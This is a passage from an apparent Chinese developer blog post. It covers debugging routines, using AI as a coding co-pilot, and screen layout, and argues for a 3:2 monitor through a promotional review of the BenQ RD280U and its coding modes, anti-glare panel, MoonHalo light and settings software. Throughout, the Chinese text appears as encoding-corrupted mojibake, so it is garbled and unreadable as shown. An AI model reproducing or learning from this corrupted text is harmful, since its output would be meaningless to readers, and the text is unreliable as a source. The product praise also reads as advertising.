</li>
</ul>
<p>å½“ä½ æŠŠè°ƒè¯•ä»â€œçµæ„Ÿâ€å˜æˆâ€œæµç¨‹â€ï¼Œè®©ä½ åœ¨æœ€å®¹æ˜“å´©çš„æ—¶å€™ï¼š</p>
<ul>
<li>
<p>ä¸éœ€è¦é‡æ–°é…ç½®ç¯å¢ƒ</p>
</li>
<li>
<p>ä¸éœ€è¦é‡æ–°æ‰¾è¯·æ±‚å‚æ•°</p>
</li>
<li>
<p>ä¸éœ€è¦é‡æ–°æƒ³â€œåº”è¯¥çœ‹å“ªé‡Œâ€</p>
</li>
<li>
<p>æ›´ä¸ä¼šåœ¨åŒä¸€ä¸ªå‘é‡Œæ‘”ä¸¤æ¬¡</p>
</li>
</ul>
<p>è¿™å°±è·Ÿå†™æŠ€æœ¯æ–‡æ¡£çš„æƒ…å†µæ˜¯ä¸€æ ·çš„ï¼Œæ˜¯é‚£ç§å†™çš„æ—¶å€™è§‰å¾—éº»çƒ¦ï¼Œä½†ç”¨è¿‡ä¸¤æ¬¡å°±ä¼šæ„Ÿè°¢è‡ªå·±çš„ä¸œè¥¿ã€‚</p>
<h3 data-id="heading-3">3ã€æŠŠ AI å½“â€œå‰¯é©¾é©¶â€ï¼Œè€Œä¸æ˜¯â€œä»£é©¾â€</h3>
<p>ç°åœ¨ AI ç¼–ç¨‹å¾ˆç«ï¼Œä½†æ˜¯ï¼Œå¾ˆå¤šäººä¸ºä»€ä¹ˆç”¨ AI å†™ä»£ç ï¼Œå¾ˆéš¾ç»´æŠ¤ï¼Œé¡¹ç›®è¶Šæ¥è¶Šè‡ƒè‚¿å‘¢ï¼Ÿå…¶å®ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æŠŠ AI å½“æˆäº†ä»£é©¾ï¼Œå…¶å® AI æ›´åƒæ˜¯å‰¯é©¾é©¶ã€‚å¦‚æœä½ æŠŠ AI å½“æˆâ€œä»£é©¾â€ï¼ŒæŠŠä¸€ä¸ªæ¨¡ç³Šéœ€æ±‚ä¸¢è¿‡å»ï¼ŒæŒ‡æœ›å®ƒä» 0 åˆ° 1 å†™å®Œæ•´åŠŸèƒ½ã€‚ä½ å¾ˆå¿«ä¼šå‘ç°ï¼šä½ ä¸æ˜¯å˜è½»æ¾äº†ï¼Œè€Œæ˜¯ä»â€œå†™ä»£ç â€å˜æˆäº†â€œå®¡ä»£ç â€ï¼Œè€Œä¸”å®¡èµ·æ¥æ›´ç´¯ã€é£é™©æ›´å¤§ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘çš„æ€åº¦å¾ˆç®€å•ï¼šè®©å®ƒå¸®æˆ‘æŠŠâ€œæ‚æ´»â€å˜å°‘ï¼ŒæŠŠâ€œå†³ç­–è´¨é‡â€å˜é«˜ã€‚æˆ‘æœ€æ¨èçš„ç”¨æ³•ï¼Œå°±æ˜¯è®© AI å¹²è‡ªå·±æ“…é•¿çš„äº‹æƒ…ã€‚</p>
<p>AI æœ€é€‚åˆçš„æ˜¯ä¸‰ç±»ä»»åŠ¡ï¼š</p>
<ul>
<li>
<p>ä¿¡æ¯å‹ç¼©ï¼šæ€»ç»“æ–‡æ¡£ã€å½’çº³ PR è®¨è®ºç‚¹ã€æç‚¼å˜æ›´å½±å“é¢</p>
</li>
<li>
<p>æ–¹æ¡ˆå¯¹ç…§ï¼šç»™ 3 ç§å®ç°æ€è·¯ï¼Œåˆ—å‡º trade-off</p>
</li>
<li>
<p>è¾¹ç•Œæ£€æŸ¥ï¼šå¸®ä½ è¡¥å……å¼‚å¸¸å¤„ç†ã€å‚æ•°æ ¡éªŒã€æµ‹è¯•ç”¨ä¾‹</p>
</li>
</ul>
<p>æœ€ä¸é€‚åˆçš„æ˜¯ï¼šä½ æŠŠä¸€ä¸ªæ¨¡ç³Šéœ€æ±‚ä¸¢è¿‡å»ï¼ŒæŒ‡æœ›å®ƒå†™å®Œä¸€æ•´ä¸ªåŠŸèƒ½ï¼Œç„¶åä½ å†å»â€œéªŒæ”¶â€ã€‚è¿™ä¼šè®©ä½ ä»â€œå†™ä»£ç â€å˜æˆâ€œå®¡ä»£ç â€ï¼Œæ›´ç´¯ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘å¸¸ç”¨çš„â€œå‰¯é©¾é©¶â€å·¥ä½œæµï¼š</p>
<ol>
<li>
<p>æˆ‘å…ˆå†™ 5 è¡Œï¼šè¦åšä»€ä¹ˆï¼ˆGoalï¼‰ã€ä¸åšä»€ä¹ˆï¼ˆNon-goalsï¼‰ã€çº¦æŸï¼ˆConstraintsï¼‰</p>
</li>
<li>
<p>è®© AI ç»™ 3 ç§æ–¹æ¡ˆ + é£é™©</p>
</li>
<li>
<p>æˆ‘é€‰ä¸€ç§åï¼Œå†è®© AI å¸®æˆ‘è¡¥ï¼šè¾¹ç•Œã€æµ‹è¯•ã€å›æ»š</p>
</li>
<li>
<p>å…³é”®ä»£ç æˆ‘è‡ªå·±å†™ï¼ŒAI åªå¸®æˆ‘è¡¥â€œæ¼ç½‘ä¹‹é±¼â€</p>
</li>
</ol>
<p>è¿™æ ·åšï¼Œä½ ä¼šå‘ç°ï¼šAI å‚ä¸è¶Šé åï¼Œè¶Šæ¥è¿‘â€œæ£€æŸ¥/è¡¥é½â€ï¼Œå®ƒè¶Šå¯é ï¼›è¶Šé å‰ï¼Œå®ƒè¶Šå®¹æ˜“ç¿»è½¦ã€‚</p>
<h2 data-id="heading-4">äºŒã€å¾ˆå¤šäººçš„çœŸæ­£ç“¶é¢ˆï¼šä¸æ˜¯â€œä¸ä¼šå†™â€ï¼Œè€Œæ˜¯â€œæ”¾ä¸ä¸‹â€</h2>
<p>å¦‚æœä¸Šé¢è¿™äº›æ–¹æ³•éƒ½æœ‰æ•ˆï¼Œä½†å®ƒä»¬æœ‰ä¸€ä¸ªéšå«å‰æï¼š</p>
<p>ä½ çš„å·¥ä½œå°è¶³å¤Ÿå¤§ï¼Œèƒ½æ‰¿è½½ä½ åŒæ—¶å¤„ç†çš„ä¿¡æ¯ã€‚</p>
<p>ç°å®å´æ˜¯å¤šæ•°ç¨‹åºå‘˜çš„å±å¹•å¸ƒå±€åƒåœ¨åšâ€œæ‹¼å›¾â€ï¼š</p>
<ul>
<li>
<p>IDE è¦å¼€ç€ï¼ˆè¿˜è¦å·¦ä¾§æ–‡ä»¶æ ‘/å³ä¾§å¤§çº²/åº•éƒ¨ç»ˆç«¯ï¼‰</p>
</li>
<li>
<p>æµè§ˆå™¨è¦å¼€ç€ï¼ˆçœ‹æ¥å£æ–‡æ¡£/æŸ¥é—®é¢˜/è·‘é¡µé¢ï¼‰</p>
</li>
<li>
<p>æ—¥å¿—è¦å¼€ç€ï¼ˆç»ˆç«¯ã€Dockerã€ç›‘æ§å¹³å°ï¼‰</p>
</li>
<li>
<p>è¿˜è¦ç•™ä¸€å—ç»™ IMã€ä¼šè®®ã€ä»»åŠ¡ç®¡ç†</p>
</li>
</ul>
<p>å¦‚æœå±å¹•ä¸å¤Ÿï¼Œä½ å°±åªèƒ½ä¸åœåˆ‡æ¢ã€é®æŒ¡ã€ç¼©æ”¾ã€‚</p>
<p>æ³¨æ„åŠ›ä¸æ˜¯è¢«ä½ æµªè´¹çš„ï¼Œæ˜¯è¢«å¸ƒå±€å¼ºè¡Œæ‰“æ–­çš„ã€‚</p>
<h2 data-id="heading-5">ä¸‰ã€ç«–å±æ˜¯ç¨‹åºå‘˜çš„â€œé›†ä½“è¯¯è§£â€ï¼šæˆ‘ä»¬ç¼ºçš„ä¸æ˜¯é«˜åº¦ï¼Œè€Œæ˜¯å¯ç”¨å¸ƒå±€</h2>
<p>æˆ‘å‘ç°ä¸€ä»¶ç‰¹åˆ«æœ‰æ„æ€çš„äº‹æƒ…ï¼Œæˆ‘ä»¬ç¨‹åºå‘˜å–œæ¬¢ä½¿ç”¨åŒå±å¹•ï¼Œæ›´å–œæ¬¢ä½¿ç”¨ç«–å±å†™ä»£ç ã€çœ‹ä»£ç ï¼Œå¦å¤–ä¸€ä¸ªå±å¹•çœ‹æ–‡æ¡£ï¼Œä½†æ˜¯ï¼Œæˆ‘è®¤ä¸ºç«–å±å¹¶ä¸æ˜¯æœ€ä½³æ–¹æ¡ˆã€‚æˆ‘çŸ¥é“å¾ˆå¤šäººä¼šè¯´ï¼šâ€œå†™ä»£ç å½“ç„¶è¦ç«–å±å•Šï¼Œä»£ç æ˜¯ä»ä¸Šå¾€ä¸‹çš„ã€‚â€</p>
<p>å¬èµ·æ¥åˆç†ï¼Œä½†åœ¨çœŸå®å·¥ç¨‹é‡Œï¼Œç»å¸¸ç›¸åã€‚å…¶å®ï¼Œå·¥ç¨‹ä»£ç æ›´å¸¸è§çš„é—®é¢˜ï¼šä¸æ˜¯çœ‹ä¸å¤Ÿè¡Œæ•°ï¼Œè€Œæ˜¯è¡Œå¤ªé•¿ã€‚</p>
<p>ç°å®é‡Œä½ å¸¸é‡åˆ°çš„é—®é¢˜æ˜¯ï¼š</p>
<ul>
<li>
<p>é•¿ç±»å‹åã€é•¿æ³›å‹ã€é•¿é“¾å¼è°ƒç”¨</p>
</li>
<li>
<p>JSON / YAML / SQL</p>
</li>
<li>
<p>æ—¥å¿—è¡Œã€å †æ ˆã€è·¯å¾„</p>
</li>
<li>
<p>diff å¯¹ç…§</p>
</li>
</ul>
<p>ç«–å±çš„ä»£ä»·æ˜¯ å®½åº¦å˜çª„ï¼Œä½ ä¼šæ›´é¢‘ç¹åœ°ï¼š</p>
<ul>
<li>
<p>è§¦å‘è‡ªåŠ¨æ¢è¡Œï¼ˆé˜…è¯»æ–­è£‚ã€ç¼©è¿›å±‚çº§æ›´éš¾çœ‹æ¸…ï¼‰</p>
</li>
<li>
<p>æˆ–è€…æ¨ªå‘æ»šåŠ¨ï¼ˆæ›´ç—›è‹¦ï¼‰</p>
</li>
</ul>
<p>å¾ˆå¤šâ€œçœ‹èµ·æ¥éœ€è¦æ›´å¤šé«˜åº¦â€çš„åœºæ™¯ï¼Œæœ¬è´¨ä¸Šæ›´éœ€è¦å®½åº¦æ¥ä¿æŒä»£ç ç»“æ„æ¸…æ™°ã€‚</p>
<p>è€Œä¸”ï¼Œæˆ‘ä»¬çš„ç¼–ç¨‹æˆ‘ä»¬è¿˜éœ€è¦åœ¨ç¼–ç¨‹ IDE é‡Œè¿›è¡Œè°ƒè¯•ï¼ŒæŸ¥çœ‹å·¥ä½œå°ï¼Œä½¿ç”¨èµ„æºç®¡ç†å™¨ï¼Œå¾ˆå¤šæƒ…å†µä¸‹æ˜¯å·¦å³å¸ƒå±€ï¼Œåœ¨ç«–å±å±å¹•é‡Œéå¸¸ä¸æ–¹ä¾¿ã€‚</p>
<p>å››ã€é‚£ç¨‹åºå‘˜éœ€è¦ä»€ä¹ˆæ ·çš„ä¸»åŠ›æ˜¾ç¤ºå±å‘¢ï¼Ÿ</p>
<p>æˆ‘è¯•è¿‡ 16:9ï¼Œä¹Ÿè¯•è¿‡è·Ÿé£ç«–å±ï¼Œæœ€åå‘ç°ä¸€ä¸ªå¾ˆâ€œä¸­åº¸ä½†è€ç”¨â€çš„ç­”æ¡ˆï¼š3:2ã€‚</p>
<p>ä¸ºä»€ä¹ˆæˆ‘ä¼šæœ‰è¿™ç§æ„Ÿæ…¨å‘¢ï¼Ÿå› ä¸ºæˆ‘æœ€è¿‘ä¹°äº†ä¸€æ¬¾ 28 å¯¸ 4K çš„ä¸“ä¸šç¼–ç¨‹æ˜¾ç¤ºå™¨ï¼šæ˜åŸº RD280Uï¼Œå®ƒå°±é‡‡å–äº†ç‰¹æ®Šçš„å±æ¯”ï¼š3:2ã€‚</p>
<p>ä½ å¯ä»¥æŠŠå®ƒç†è§£æˆï¼š</p>
<p>æ¯” 16:9 æ›´é«˜ï¼ˆå¤šå‡ºå¯è§‚çš„å‚ç›´å·¥ä½œåŒºï¼‰ï¼Œä½†åˆä¸åƒç«–å±é‚£æ ·ç‰ºç‰²å®½åº¦ï¼ˆä»ç„¶é€‚åˆå¹¶æ’ä¸ IDE å¤šæ ï¼‰</p>
<p>åœ¨æˆ‘çœ‹æ¥ï¼Œå®ƒåˆšå¥½å¡åœ¨ä¸€ä¸ªå¯¹ç¨‹åºå‘˜å¾ˆå‹å¥½çš„å¹³è¡¡ç‚¹ä¸Šã€‚</p>
<p>å®ƒå¤šå‡ºæ¥çš„â€œé«˜åº¦â€ï¼Œä¸æ˜¯æ‹¿æ¥å¤šçœ‹å‡ åè¡Œä»£ç ï¼Œè€Œæ˜¯æ‹¿æ¥â€œå°‘æ»šåŠ¨â€</p>
<p>ä½ ä¼šæ›´æ˜æ˜¾æ„Ÿè§‰åˆ°è¿™äº›å˜åŒ–ï¼š</p>
<ul>
<li>
<p>ç»ˆç«¯èƒ½å¤šæ˜¾ç¤ºå‡ è¡Œæ—¥å¿—ï¼ŒæŸ¥é—®é¢˜å°‘ç¿»é¡µ</p>
</li>
<li>
<p>diff/PR é¡µé¢å°‘æ»šåŠ¨ï¼Œreview æ›´é¡º</p>
</li>
<li>
<p>æ–‡æ¡£é¡µé¢å°‘æ»šåŠ¨ï¼Œç†è§£æ›´è¿ç»­</p>
</li>
<li>
<p>IDE åº•éƒ¨ï¼ˆProblems/Tests/Terminalï¼‰å¼€ç€ä¹Ÿä¸æŒ¤</p>
</li>
</ul>
<p>é«˜åº¦å¸¦æ¥çš„æ˜¯â€œè¿ç»­æ€§â€ï¼Œè€Œè¿ç»­æ€§ä¼šç›´æ¥é™ä½ç–²åŠ³ã€‚</p>
<p>è€Œå®½åº¦ä»ç„¶å¤Ÿç”¨ï¼šIDE å·¦å³æ å¸¸é©»ä¹Ÿä¸ç„¦è™‘ã€‚3:2 çš„å¥½å¤„åœ¨äºï¼šä½ ä¸ç”¨ä¸ºäº†å¤šç‚¹é«˜åº¦ï¼ŒæŠŠå®½åº¦ç åˆ°â€œå¤„å¤„æ¢è¡Œâ€çš„ç¨‹åº¦ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8da878e169d247b3ad3e3c51d58dab12~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=BwG21ueU8431waIbWrO4g4ICFiA%3D" alt="" loading="lazy"/></p>
<p>å®ƒå…è®¸ä½ åœ¨å¸¸è§çš„å¼€å‘å§¿åŠ¿ä¸‹ç»´æŒç¨³å®šå¸ƒå±€ï¼š</p>
<ul>
<li>
<p>IDE ä¸­å¤®åŒºä¿æŒèˆ’æœçš„ä»£ç åˆ—å®½</p>
</li>
<li>
<p>å·¦ä¾§å¯¼èˆª + å³ä¾§å·¥å…·æ å¯ä»¥å¸¸é©»</p>
</li>
<li>
<p>å¶å°”å†å¹¶æ’ä¸€ä¸ªæµè§ˆå™¨æˆ–æ–‡æ¡£ï¼Œä¹Ÿè¿˜ç®—èƒ½æ‰“</p>
</li>
</ul>
<p>16:9 å¤©ç”Ÿæ›´åƒè§†é¢‘å†…å®¹çš„æ¯”ä¾‹ï¼Œè€Œ 3:2 æ›´åƒç»™ç”Ÿäº§åŠ›å‡†å¤‡çš„ç”»å¸ƒã€‚æˆ‘æ˜¯ç”¨äº†å°ä¸€ä¸ªæœˆäº†ï¼Œç„¶åç»™æˆ‘çš„æ„Ÿå—å°±æ˜¯ï¼šå½“ä½ ä¸€å¤© 8 å°æ—¶éƒ½åœ¨â€œè¯»ã€å†™ã€å¯¹ç…§ä¿¡æ¯â€ï¼Œè¿™ä¸ªå–å‘å·®å¼‚çœŸçš„æ˜¯ä¼šç´¯è®¡æˆä½“éªŒå·®è·çš„ï¼Œè€Œä¸”å¾ˆæ˜æ˜¾ã€‚</p>
<h2 data-id="heading-6">äº”ã€çœŸæ­£è®©æˆ‘ææ•ˆçš„ï¼Œä¸æ˜¯å‚æ•°ï¼Œæ˜¯è¿™å‡ ä¸ªç»†èŠ‚</h2>
<p>æˆ‘æœ€è¿‘ä½¿ç”¨çš„æ˜åŸº RD280U ä¸“ä¸šç¼–ç¨‹æ˜¾ç¤ºå™¨ï¼Œè¿™æ¬¾æ˜¾ç¤ºå™¨ç›®å‰æ¥è®²æ˜¯æˆ‘ä½¿ç”¨çš„æœ€æ»¡æ„çš„ä¸€æ¬¾æ˜¾ç¤ºå™¨ï¼ŒåŠŸèƒ½è¶…çº§ä¸°å¯Œï¼Œè¶…çº§é€‚åˆå’±ä»¬ç¨‹åºå‘˜ã€‚</p>
<p>æˆ‘ä¸æ‰“ç®—æŠŠå‚æ•°æŒ¨ä¸ªå¿µä¸€éï¼Œè¿™ä¸ªå¤§å®¶éƒ½èƒ½æŸ¥åˆ°ã€‚æˆ‘åªè¯´ï¼šå®ƒè§£å†³äº†æˆ‘å“ªå‡ ç±»â€œç¼–ç¨‹æ‘©æ“¦â€ã€‚</p>
<p>1ã€ä¸“ä¸šç¼–ç¨‹æ¨¡å¼</p>
<p>å®ƒé’ˆå¯¹å’±ä»¬ç¨‹åºå‘˜çš„ç¼–ç¨‹ç¯å¢ƒäº†ï¼Œæä¾›äº†æ·±è‰²å’Œæµ…è‰²çš„ä¸¤ç§ç¼–ç¨‹ä¸»é¢˜æ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡æ™ºèƒ½è°ƒèŠ‚ä»£ç è‰²å½©ç³»åˆ—å‚æ•°ï¼Œè®©ä»£ç æ›´æ¸…æ™°æ˜“è¾¨ï¼Œå‡å°‘æˆ‘ä»¬çš„ç”¨çœ¼å‹åŠ›ï¼Œè¿˜æä¾›äº†ç¼–ç¨‹è§¦é”®è°ƒå‡ºå¿«æ·èœå•æ¥å¿«é€Ÿåˆ‡æ¢ç¼–ç¨‹æ¨¡å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c76fa51ca7240868bdb38fefde85adb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=GGg5PLe8tMYXeuDi0tT84lDl1%2F4%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23164312910943988b48fe992a7c5a13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=mORwsNKIElifFbkq7%2BYz0I8QTKw%3D" alt="" loading="lazy"/></p>
<p>é€šè¿‡æ™®é€šæ¨¡å¼å’Œä¸“ä¸šç¼–ç¨‹æ¨¡å¼å¯¹æ¯”ï¼Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œä¸“ä¸šç¼–ç¨‹æ¨¡å¼ä¸‹ï¼Œæ•ˆæœæ›´å¥½ï¼Œä»£ç æ›´æ¸…æ™°ï¼Œçªå‡ºå¾ˆå®¹æ˜“è¯†åˆ«ã€‚</p>
<p>è€Œä¸”è¿˜èƒ½åœ¨åŸºç¡€è®¾ç½®ä¸Šï¼Œå†æ ¹æ®è‡ªå·±çš„åå¥½è°ƒèŠ‚æ›´ç»†èŠ‚çš„å‚æ•°ï¼Œæ¯”å¦‚æˆ‘å°±å°±å–œæ¬¢æŠŠè‰²æ¸©è°ƒæˆï¼Œæ³›çº¢è‰²ï¼Œçœ‹èµ·æ¥ç‰¹åˆ«èˆ’æœï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b9bcdd4289549f6b889ff20c9488078~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=ZjZsGJBmJ%2Bje75u%2BKqlK76BHUds%3D" alt="" loading="lazy"/></p>
<p>2ã€æŠ—åå°„é¢æ¿</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¢æ¿ä¸“é—¨æ¶‚äº†ä¸€å±‚åå°„æ¶‚å±‚ï¼Œå‡å°‘å±å¹•çœ©å…‰å¯¹ä»£ç è¯†åˆ«çš„å¹²æ‰°ï¼Œæ—¢ä¿æŠ¤çœ¼ç›çš„åŒæ—¶ï¼Œè¿˜èƒ½è®©æˆ‘ä»¬æ›´ä¸“æ³¨äºç¼–ç æœ¬èº«ï¼Œä»£ç ä¹Ÿæ›´æ¸…æ™°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0256ef3cebe4faf9a99f698fede65ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=6EIply645bM64AcnrDGk2zapTmc%3D" alt="" loading="lazy"/></p>
<p>3ã€MoonHalo å’ŒçŒ«å¤´é¹°æ¨¡å¼</p>
<p>è€Œä¸”è¿™æ¬¾æ˜¾ç¤ºå™¨å¯¹äºæˆ‘ä»¬ç¨‹åºå‘˜ç¼–ç åœºæ™¯å¾ˆç†Ÿæ‚‰ï¼Œæä¾›äº† MoonHalo å’ŒçŒ«å¤´é¹°æ¨¡å¼ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ä½ å¾ˆå®¹æ˜“è¿›å…¥æ²‰æµ¸å¼ç¼–ç¨‹ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬æœ‰å¾ˆå¤šç¨‹åºå‘˜å–œæ¬¢å¤œæ·±äººé™çš„æ—¶å€™ç¼–ç¨‹ï¼Œé‚£æ—¶å€™çµæ„Ÿå¤šï¼Œå¼€å¯ MoonHalo æ¨¡å¼ï¼Œæ˜¾ç¤ºå™¨èƒŒéƒ¨æœ‰ä¸€ä¸ªå…‰åœˆç¯ï¼Œéå¸¸æœ‰æ°›å›´æ„Ÿã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0ef4c4eeaf04c6da37a0b7b0a6ee1d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=9%2BgRAKnYqP9zYDaTz5vWR3oQmlg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3ec9c084e9d4335abe5d5dba058ef33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=eKiDfMA23GaSJueEmGflj83mOZo%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœè¯´ MoonHalo æ¨¡å¼æ˜¯æ‰“é€ ç¯å¢ƒæ°›å›´çš„ï¼Œé‚£çŒ«å¤´é¹°æ¨¡å¼æ›´åƒæ˜¯ä¸€å¥—åå‘å¤œé—´ä¸“æ³¨çš„åŠ¨æ€è°ƒæ ¡ï¼Œå¯ç”¨æ·±è‰²ç¼–ç æ¨¡å¼ä¹‹åï¼Œè°ƒèŠ‚çŒ«å¤´é¹°æ¨¡å¼ç­‰çº§ï¼Œæ˜¾ç¤ºå™¨çš„äº®åº¦å’Œè‰²å½©æ›´é€‚åˆæ·±å¤œç¯å¢ƒï¼Œè®©æˆ‘ä»¬æ›´ä¸“æ³¨ï¼Œä¹Ÿæ›´ä¿æŠ¤çœ¼ç›ã€‚æ‰€ä»¥ï¼Œç®€å•è®²ï¼ŒMoonHalo æ˜¯ç»™å¤§è„‘ä¸€ä¸ªâ€œè¿›å…¥çŠ¶æ€â€çš„ä»ªå¼æ„Ÿï¼Œè€ŒçŒ«å¤´é¹°æ¨¡å¼æ˜¯ç»™çœ¼ç›ä¸€ä¸ªâ€œèƒ½åšæŒæ›´ä¹…â€çš„èˆ’é€‚åŒºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0eb96e11d3d24c979ab4cf0593668338~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=SMV9W3i3WcbfL1I17zSYzdt6zvg%3D" alt="" loading="lazy"/></p>
<p>4ã€é…å¥—è½¯ä»¶ï¼Œç®€å•ç›´è§‚ä¾¿æ·</p>
<p>åŠŸèƒ½å¾ˆå¤šï¼Œæˆ‘å°±ä¸ä¸€ä¸€ä»‹ç»äº†ï¼Œæ­£å› ä¸ºåŠŸèƒ½ä¸°å¯Œï¼Œæ‰€ä»¥ï¼Œè¿˜ä¸“é—¨ä¸ºè¿™ä¸ªæ˜¾ç¤ºå™¨é…å¤‡äº†ä¸€æ¬¾è½¯ä»¶ï¼Œç”¨æ¥é…ç½®å’Œè°ƒèŠ‚è¿™æ¬¾æ˜¾ç¤ºå™¨ã€‚å¤§å®¶å¯ä»¥æ„Ÿå—ä¸€ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22294ab2f2e84c24b097c36806c7ab1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=3e%2BkHc49YvizjfUloVeGT9%2FRsTw%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥åˆ‡æ¢è‰²å½©æ¨¡å¼ã€è°ƒèŠ‚å±å¹•äº®åº¦ã€æ™ºæ…§è“å…‰ã€æ¡Œé¢åˆ†åŒºã€è·¨ç•Œæ–¹å¼ã€MoonHalo æ¨¡å¼ç­‰åŠŸèƒ½ï¼ŒçœŸçš„æ˜¯ä¸“ä¸šç¨‹åºå‘˜å¿…å¤‡ç¼–ç¨‹å±å¹•å’Œæ•ˆç‡ç¥å™¨ã€‚</p>
<p>è€Œä¸”è¿˜æœ‰flowåŠŸèƒ½ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„ä¹ æƒ¯è®¾ç½®å¥½ä¸åŒçš„åœºæ™¯é…ç½®ã€‚æ¯”å¦‚ï¼Œæˆ‘ä¸€èˆ¬æ˜¯ä¸Šåˆå†™æ–‡ç« ï¼Œä¸‹åˆå†™ä»£ç ã€‚æ ¹æ®ä¸åŒçš„æ—¶é—´èŠ‚ç‚¹å¯åŠ¨ä¸åŒçš„åœºæ™¯ï¼Œåœºæ™¯ä¸­å¯ä»¥é…ç½®å¯¹åº”çš„æ“ä½œï¼Œæ‰“å¼€åº”ç”¨ç¨‹åºï¼Œæ˜¾ç¤ºå¯¹åº”çš„è‰²å½©å±å¹•æ•ˆæœï¼Œæ›´å®¹æ˜“è¿›å…¥å¿ƒæµæ¨¡å¼ï¼Œéå¸¸ä¾¿æ·å’Œæ–¹ä¾¿ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b88d1bb64f5b4ce5b5df1db50ad46dea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9vbmdnZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768450110&amp;x-signature=r7ZAazYFdkE4mp0FPJYnTsYMn1s%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä¸ªäººä½¿ç”¨æ„Ÿè§‰æ˜¯éå¸¸æ»¡æ„ï¼Œæ‰€ä»¥ï¼Œæ¨èç»™å¤§å®¶ã€‚</p>
<h2 data-id="heading-7">å…­ã€å†™åœ¨æœ€å</h2>
<p>åœ¨æˆ‘çœ‹æ¥ï¼Œæ•ˆç‡æ˜¯ç³»ç»Ÿå·¥ç¨‹ï¼Œå±å¹•æ˜¯ä½ çš„"åº•å±‚åŸºå»º"ã€‚</p>
<p>ç¨‹åºå‘˜çš„æ•ˆç‡åˆ°åº•é ä»€ä¹ˆæå‡ï¼Ÿå…¶å®ï¼Œå¾ˆæ¸…æ¥šäº†ï¼Œä¸æ˜¯ä½ èƒ½ä¸èƒ½å†™ä»£ç ï¼Œè€Œæ˜¯ä½ çš„å·¥ä½œç¯å¢ƒæœ‰æ²¡æœ‰åœ¨æ‹–ä½ åè…¿ã€‚å¿«æ·é”®ã€è°ƒè¯•æµç¨‹ã€AI å·¥å…·ï¼Œè¿™äº›éƒ½æ˜¯"æœ¯"ï¼Œä½†å¦‚æœä½ çš„å±å¹•æ”¾ä¸ä¸‹ä½ çš„å·¥ä½œæµï¼Œæ‰€æœ‰ä¼˜åŒ–éƒ½ä¼šæ‰“æŠ˜æ‰£ã€‚</p>
